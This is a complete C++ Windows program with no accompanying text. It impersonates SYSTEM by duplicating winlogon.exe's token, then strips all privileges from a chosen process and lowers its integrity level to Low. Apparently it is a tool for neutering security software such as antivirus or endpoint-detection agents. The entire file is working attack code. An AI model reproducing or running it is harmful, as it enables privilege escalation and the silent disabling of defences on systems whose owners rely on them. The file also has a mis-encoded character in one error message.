#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "Version.lib")

bool EnablePrivilege(LPCWSTR privName) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << "\n";
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValueW(nullptr, privName, &luid)) {
        std::cerr << "LookupPrivilegeValueW failed: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken,
        FALSE,
        &tp,
        sizeof(tp),
        nullptr,
        nullptr) ||
        GetLastError() != ERROR_SUCCESS) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << "\n";
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

bool ImpersonateSystem()
{
    DWORD systemPid = 0;
    // 1. Find winlogon.exe
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                systemPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!systemPid) return false;

    // 2. Open winlogon.exe with QUERY_INFORMATION
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hProc) return false;

    // 3. Grab its token, duplicate it for impersonation
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
        CloseHandle(hProc);
        return false;
    }
    HANDLE hDup = nullptr;
    if (!DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        nullptr,
        SecurityImpersonation,
        TokenImpersonation,
        &hDup))
    {
        CloseHandle(hToken);
        CloseHandle(hProc);
        return false;
    }

    // 4. Impersonate
    BOOL ok = ImpersonateLoggedOnUser(hDup);
    CloseHandle(hDup);
    CloseHandle(hToken);
    CloseHandle(hProc);
    return ok == TRUE;
}


// Remove all privileges from the token
bool DropAllPrivileges(HANDLE hToken) {
    DWORD cb = 0;
    if (!GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &cb) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "GetTokenInformation (size) failed: " << GetLastError() << "\n";
        return false;
    }
    auto pPrivs = static_cast<PTOKEN_PRIVILEGES>(LocalAlloc(LPTR, cb));
    if (!GetTokenInformation(hToken, TokenPrivileges, pPrivs, cb, &cb)) {
        std::cerr << "GetTokenInformation (data) failed: " << GetLastError() << "\n";
        LocalFree(pPrivs);
        return false;
    }
    for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) {
        pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_REMOVED;
    }
    if (!AdjustTokenPrivileges(hToken, FALSE, pPrivs, 0, nullptr, nullptr)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << "\n";
        LocalFree(pPrivs);
        return false;
    }
    LocalFree(pPrivs);
    return true;
}

// Set the token Integrity Level to the given SID string (e.g. Low: "S-1-16-4096")
bool SetTokenIntegrity(HANDLE hToken, LPCWSTR wszIntegritySid) {
    PSID pSid = nullptr;
    if (!ConvertStringSidToSidW(wszIntegritySid, &pSid)) {
        std::cerr << "ConvertStringSidToSid failed: " << GetLastError() << "\n";
        return false;
    }
    TOKEN_MANDATORY_LABEL tml = {};
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = pSid;
    DWORD cb = sizeof(tml) + GetLengthSid(pSid);
    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &tml, cb)) {
        std::cerr << "SetTokenInformation (Integrity) failed: " << GetLastError() << "\n";
        LocalFree(pSid);
        return false;
    }
    LocalFree(pSid);
    return true;
}

bool DropAndReport(DWORD pid) {
    std::cout << "[*] Dropping privileges for PID " << pid << "\n";
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Failed to open process: " << GetLastError() << "\n";
        return false;
    }
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProcess,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT |
        TOKEN_QUERY,
        &hToken)) {
        std::cerr << "Failed to open process token: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }

    if (DropAllPrivileges(hToken))
        std::cout << "[+] All privileges removed\n";
    else
        std::cerr << "[-] Could not remove privileges\n";

    if (SetTokenIntegrity(hToken, L"S-1-16-4096"))
        std::cout << "[+] Integrity level set to Low\n";
    else
        std::cerr << "[-] Could not set integrity level\n";

    CloseHandle(hToken);
    CloseHandle(hProcess);
    return true;
}

std::wstring StringToWString(const std::string& str) {
    int sz = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    std::wstring w(sz, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &w[0], sz);
    if (!w.empty() && w.back() == L'\0') w.pop_back();
    return w;
}

std::string WStringToString(const std::wstring& wstr) {
    int sz = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(sz, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &s[0], sz, nullptr, nullptr);
    if (!s.empty() && s.back() == '\0') s.pop_back();
    return s;
}

std::wstring GetImagePath(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return L"";
    wchar_t buf[MAX_PATH];
    DWORD sz = MAX_PATH;
    if (QueryFullProcessImageNameW(hProc, 0, buf, &sz)) {
        CloseHandle(hProc);
        return std::wstring(buf, sz);
    }
    CloseHandle(hProc);
    return L"";
}

std::wstring GetFileDescription(const std::wstring& path) {
    DWORD dummy;
    DWORD size = GetFileVersionInfoSizeW(path.c_str(), &dummy);
    if (!size) return L"";
    std::vector<BYTE> data(size);
    if (!GetFileVersionInfoW(path.c_str(), 0, size, data.data()))
        return L"";

    struct LANGCODE { WORD lang; WORD codepage; } *pTrans;
    UINT cbTrans = 0;
    if (!VerQueryValueW(data.data(),
        L"\\VarFileInfo\\Translation",
        (LPVOID*)&pTrans,
        &cbTrans))
        return L"";

    wchar_t subBlock[100];
    swprintf_s(subBlock, L"\\StringFileInfo\\%04x%04x\\FileDescription",
        pTrans[0].lang, pTrans[0].codepage);

    LPWSTR desc = nullptr;
    UINT descLen = 0;
    if (VerQueryValueW(data.data(), subBlock, (LPVOID*)&desc, &descLen) && descLen) {
        return std::wstring(desc, descLen);
    }
    return L"";
}

void PrintUsage(const char* prog) {
    std::cout <<
        "Usage:\n"
        "  " << prog << " --pid <PID>\n"
        "  " << prog << " --pname <process name>\n"
        "  " << prog << " --image <exe file name>\n";
}

int main(int argc, char* argv[]) {

    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        std::cerr << "[-] Could not acquire necessary privileges ¨C aborting\n";
        return false;
    }
    
    if (!ImpersonateSystem()) {
        std::cerr << "[-] Could not impersonate SYSTEM\n";
        return 1;
    }

    HANDLE hThreadToken = nullptr;
    if (OpenThreadToken(GetCurrentThread(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        FALSE,
        &hThreadToken))
    {
        LUID luid;
        LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid);

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hThreadToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hThreadToken);
    }

    if (argc != 3) {
        PrintUsage(argv[0]);
        return 1;
    }

    std::string flag = argv[1];
    if (flag == "--pid") {
        DWORD pid = std::stoul(argv[2]);
        return DropAndReport(pid) ? 0 : 1;
    }
    else if (flag == "--pname" || flag == "--image") {
        std::wstring pattern = StringToWString(argv[2]);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) {
            std::cerr << "Failed to snapshot processes: " << GetLastError() << "\n";
            return 1;
        }

        PROCESSENTRY32W pe = { sizeof(pe) };
        std::vector<DWORD> matches;
        std::cout << "Matching processes:\n";
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, pattern.c_str()) == 0) {
                    DWORD pid = pe.th32ProcessID;
                    std::wstring img = GetImagePath(pid);
                    std::wstring desc = img.empty() ? L"" : GetFileDescription(img);
                    std::cout
                        << "  Name: " << WStringToString(pe.szExeFile)
                        << "  PID: " << pid
                        << "  Desc: " << WStringToString(desc)
                        << "  Path: " << WStringToString(img)
                        << "\n";
                    matches.push_back(pid);
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);

        if (matches.empty()) {
            std::cout << "No matching processes found.\n";
            return 0;
        }

        DWORD choice = 0;
        std::cout << "\nEnter PID to drop privileges: ";
        std::cin >> choice;
        if (std::find(matches.begin(), matches.end(), choice) == matches.end()) {
            std::cerr << "Invalid PID selected.\n";
            return 1;
        }
        return DropAndReport(choice) ? 0 : 1;
    }
    else {
        PrintUsage(argv[0]);
        return 1;
    }
}
